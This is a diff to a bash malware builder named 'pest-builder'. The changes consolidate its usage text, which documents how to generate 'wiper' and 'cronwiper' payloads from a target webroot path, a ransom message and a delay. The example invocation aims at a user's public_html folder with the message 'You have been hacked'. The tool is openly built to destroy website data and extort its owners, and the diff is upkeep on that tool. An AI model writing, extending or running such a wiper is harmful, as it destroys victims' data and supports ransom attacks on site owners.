@@ -73,11 +73,14 @@ done
 '
 
 
+usage_text="Usage:\n\tbash pest-builder wiper|cronwiper path/to/webroot \"Ransom message\" sleepseconds\n\n";
+usage_text+="Example:\n\tbash pest-builder wiper /home/user/public_html \"You have been hacked\" 300\n\n";
+usage_text+="\tbash pest-builder cronwiper /home/user/public_html \"You have been hacked\"\n\n";
+
 if [[ "$1" = "wiper" || "$1" = "cronwiper" ]]; then
 
     if [[ "$#" != 4 ]]; then
-        echo "Usage: bash pest-builder wiper|cronwiper path/to/webroot \"Ransom message\" sleepseconds";
-        echo "Example: bash pest-builder wiper /hom4/user/public_html \"You have been hacked\" 300";
+        echo -e $usage_text
         exit
     fi
 
@@ -105,8 +108,8 @@ if [[ "$1" = "wiper" || "$1" = "cronwiper" ]]; then
 
 else
 
-    echo "Usage: build wiper|cronwiper path/to/webroot \"Ransom message\" sleepseconds";
-    echo "Example: build wiper /hom4/user/public_html \"You have been hacked\" 300";
+    echo -e $usage_text
+
     exit
 
 fi
